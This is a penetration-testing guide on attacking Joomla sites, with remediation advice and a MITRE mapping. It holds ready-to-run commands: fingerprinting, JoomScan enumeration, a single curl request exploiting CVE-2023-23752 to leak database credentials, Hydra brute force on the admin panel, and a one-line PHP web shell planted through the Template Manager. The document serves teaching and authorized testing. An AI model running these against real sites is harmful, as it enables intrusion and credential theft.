> **English** | [Italiano](README.md)

# CMS Exploitation: Joomla & JoomScan

> - **Phase:** Web Attack - CMS Exploitation (Joomla)
> - **Visibility:** Medium (JoomScan) / Low (CVE-2023-23752 via single curl request)
> - **Prerequisites:** Joomla identified during the tech profiling phase, version 4.0.0-4.2.7 for CVE-2023-23752
> - **Output:** Joomla version, component list with CVEs, database credentials (CVE-2023-23752), potential admin access

---

## Introduction

Joomla is the second most widely used CMS in the world, with a significant presence in institutional, governmental, and university environments. Its component-based architecture (equivalent to WordPress plugins) introduces a similar attack surface: vulnerabilities that rarely affect the core but very frequently affect third-party components.

Joomla presents several characteristics that make it an interesting target in the context of penetration testing:

- **Exposed admin panel:** the administration panel is always reachable at `/administrator/`, no enumeration required.
- **Centralized authentication:** all administrative functions go through a single login endpoint, facilitating brute force attacks.
- **Native REST API:** since version 3.8, Joomla includes a REST API. In certain versions (4.0.0-4.2.7), this API is vulnerable to critical information disclosure (CVE-2023-23752).
- **Accessible version files:** the `CHANGELOG.txt` file in the site root exposes the exact version.

---

## Phase 1: Fingerprinting

The first objective is to confirm that the target uses Joomla and identify its version.

```Bash
# Identification with WhatWeb
whatweb -v http://<TARGET>

# Version check via public file
curl -s http://<TARGET>/CHANGELOG.txt | head -5

# Meta tag in page source
curl -s http://<TARGET> | grep -i "generator"
```

Sample output (CHANGELOG.txt):

```
Joomla! 4.2.6 Changelog
==========
...
```

Sample output (meta tag):

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

The version in the CHANGELOG allows direct mapping with known CVEs in the National Vulnerability Database (NVD).

---

## Phase 2: Enumeration with JoomScan

JoomScan is the OWASP tool dedicated to Joomla: it enumerates the version, installed components (with CVEs), exposed configuration files, and common misconfigurations.

```Bash
# Installation (Kali Linux)
sudo apt install joomscan -y

# Standard scan
joomscan -u http://<TARGET>

# Scan with component enumeration
joomscan -u http://<TARGET> --enumerate-components
```

Sample output:

```
    ____  _____  __  __  __  _____  ___   __    _  _
   (_  _)(  _  )(  \/  )(  )/ ___/ / __) /__\  ( \( )
  .-_)(   )(_)(  )    (  )( \___  ( (_-. /(__)\  )  (
  \____) (_____)(__)(__)(__)(_____/ \___/(__)(__)(_)\_)
                        (1.0.2)
    --=[OWASP JoomScan
    +---++---==[Version : 1.0.2

[+] Detecting Joomla Version
[++] Joomla 4.2.6                                    <-- version detected

[+] Checking for vulnerable Joomla Extensions
[!!] Extension: com_fields (Joomla 3.7 SQL Injection) - CVE-2017-8917   <-- CVE found
   URL: http://target.com/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml

[+] Checking for backup files
[++] backup files found                               <-- exposed backup files
   http://target.com/configuration.php.bak
   http://target.com/config.php.old
```

---

## Phase 3: CVE-2023-23752 - Information Disclosure via REST API

CVE-2023-23752 is a critical vulnerability affecting Joomla from version 4.0.0 to 4.2.7. It allows an unauthenticated attacker to access the application's database configurations through the REST API.

**Affected versions:** Joomla 4.0.0 - 4.2.7
**CVSS v3.1:** 5.3 (MEDIUM) - but the practical impact is much higher due to the exposed credentials.

```Bash
# Vulnerability test: single request to the API endpoint
curl -s "http://<TARGET>/api/index.php/v1/config/application?public=true" | python3 -m json.tool
```

Sample output (vulnerable endpoint):

```json
{
  "data": {
    "type": "application",
    "id": "4",
    "attributes": {
      "db_type": "mysql",
      "db_host": "localhost",
      "db_user": "joomla_user",
      "db_name": "joomla_db",
      "db_password": "P@ssw0rd123!",           <-- DATABASE CREDENTIALS IN PLAINTEXT
      "db_prefix": "yf62j_",
      "live_site": "",
      "secret": "aBcDeFgHiJkLmNoPqRsTuVwXyZ",  <-- APPLICATION SECRET KEY
      "debug": false,
      ...
    }
  }
}
```

With the database credentials, the attacker can:
1. Connect directly to the database (if MySQL is externally accessible).
2. Use the credentials for admin panel login (many admins use the same credentials).
3. Access all site user data.

---

## Phase 4: Brute Force on Admin Panel

If CVE-2023-23752 is not applicable or the database credentials do not grant panel access, brute force can be attempted on `/administrator/`:

```Bash
# With Hydra on Joomla HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form \
  "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid username and password or user is blocked."

# Note: the string "Invalid username and password or user is blocked." is the error message
# to look for. Adapt based on the version and language of the site.
```

---

## Phase 5: Post-Authentication

With admin access to the Joomla panel:

```Bash
# Web Shell deployment via Template Manager
# Extensions -> Templates -> <TEMPLATE> -> new file -> shell.php
# Content: <?php system($_GET['cmd']); ?>
# Access: http://<TARGET>/templates/<TEMPLATE>/shell.php?cmd=id
```

---

## Remediation

- **Immediate update:** update Joomla to version 4.2.8 or later (CVE-2023-23752 patch). The fix was released on 2023-02-16.
- **Disable REST API:** if not in use, disable the REST API in `Global Configuration -> Server -> Web Services API`.
- **Outdated components:** remove all unused or outdated Joomla components. Each component is a potential attack vector.
- **Admin login:** enable 2FA on the `/administrator/` panel (Joomla includes a native 2FA plugin since version 3.x). Consider IP allowlisting for admin access.
- **Exposed files:** remove `CHANGELOG.txt`, `README.txt`, `.bak`, and `.old` files from the site root.
- **Verification:** after patching, re-run the curl on `/api/index.php/v1/config/application?public=true` and verify that it responds with `403 Forbidden`.

---

## Reference Tools

| Tool | Type | Technique/Access | Primary Use Case |
| :--- | :--- | :--- | :--- |
| `joomscan` | Joomla scanner | CLI - Active | Version enumeration, components, exposed files |
| `droopescan` | CMS scanner | CLI - Active | JoomScan alternative, also supports Drupal |
| `nuclei` | Template-based | CLI - Active | CVE-2023-23752 template and other Joomla CVEs |
| `hydra` | Password cracker | CLI - Active | Brute force on `/administrator/` |
| `metasploit` | Exploitation framework | CLI/GUI | Joomla-specific CVE modules |
| `curl` | HTTP client | CLI | Manual CVE-2023-23752 test (single GET request) |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Reconnaissance | Active Scanning: Vulnerability Scanning | `T1595.002` | Scanning with JoomScan to identify the Joomla version and vulnerable components |
| Reconnaissance | Gather Victim Host Info: Software | `T1592.002` | Joomla version fingerprinting via `CHANGELOG.txt` and HTML meta tags |
| Initial Access | Exploit Public-Facing Application | `T1190` | Exploitation of CVE-2023-23752 on Joomla's REST API to obtain database credentials |
| Credential Access | Brute Force: Password Guessing | `T1110.001` | Dictionary attack on `/administrator/` with Hydra |
| Discovery | File and Directory Discovery | `T1083` | Identification of exposed configuration and backup files (`configuration.php.bak`) |
| Persistence | Server Software Component: Web Shell | `T1505.003` | PHP Web Shell deployment through Joomla's Template Manager after admin access |
| Collection | Data from Information Repositories | `T1213` | Access to database credentials and user data through CVE-2023-23752 |

---

> **Note:** The techniques documented in this guide reference publicly known CVEs
> and were practiced on Joomla instances installed in local lab environments and on
> authorized practice platforms. CVE-2023-23752 was patched in version 4.2.8
> released on 2023-02-16. Using these techniques on real Joomla instances without
> written authorization is a criminal offense.
